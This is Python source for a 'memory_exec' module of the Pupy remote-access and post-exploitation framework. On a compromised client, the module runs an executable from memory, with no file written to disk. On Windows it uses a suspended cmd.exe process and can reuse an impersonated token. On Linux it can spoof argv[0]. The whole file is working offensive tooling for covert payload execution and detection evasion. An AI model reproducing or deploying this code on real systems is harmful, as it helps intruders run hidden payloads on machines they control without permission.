# -*- coding: utf-8 -*-
# --------------------------------------------------------------
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
#
# 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
#
# 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
#
# 3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE
# --------------------------------------------------------------

from pupylib.PupyModule import (
    config, PupyModule, PupyArgumentParser,
    REQUIRE_REPL
)

from pupylib.PupyCompleter import path_completer
from modules.lib.windows.memory_exec import exec_pe
from modules.lib.linux.exec_elf import mexec

from argparse import REMAINDER
from os import path

__class_name__="MemoryExec"

@config(compatibilities=["windows", "linux"], category="manage")
class MemoryExec(PupyModule):
    """
        Execute a executable from memory
    """

    io = REQUIRE_REPL

    dependencies = {
        'linux': ['memexec'],
        'windows': ['pupymemexec', 'pupwinutils.memexec']
    }

    def __init__(self, *args, **kwargs):
        PupyModule.__init__(self,*args, **kwargs)
        self.interrupted = False
        self.mp = None

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = PupyArgumentParser(prog="memory_exec", description=cls.__doc__)
        #cls.arg_parser.add_argument('-p', '--process', default='cmd.exe', help='process to start suspended')
        cls.arg_parser.add_argument('-i', '--interactive', action='store_true', help='interact with the process stdin.')
        cls.arg_parser.add_argument('-m', '--impersonate', action='store_true', help='use the current impersonated token (to use with impersonate module)')
        cls.arg_parser.add_argument('-s', '--suspended-process', default="cmd.exe", help='change the suspended process to spawn (default: cmd.exe)')
        cls.arg_parser.add_argument('-0', '--argv0', help='Set argv[0] (linux only)')
        cls.arg_parser.add_argument('path', help='path to the exe', completer=path_completer)
        cls.arg_parser.add_argument('args', nargs=REMAINDER, help='optional arguments to pass to the exe')

    def interrupt(self):
        self.info("interrupting remote process, please wait ...")
        if self.mp:
            self.mp.close()

    def run(self, args):
        log = None
        if self.client.is_windows():
            log = exec_pe(
                self, args.args,
                path=args.path, interactive=args.interactive,
                use_impersonation=args.impersonate,
                suspended_process=args.suspended_process
            )
        elif self.client.is_linux():
            log = mexec(
                self, args.path, args.args,
                argv0=args.argv0 or path.basename(args.path),
                interactive=args.interactive
            )

        if log and type(log) is str:
            self.log(log)
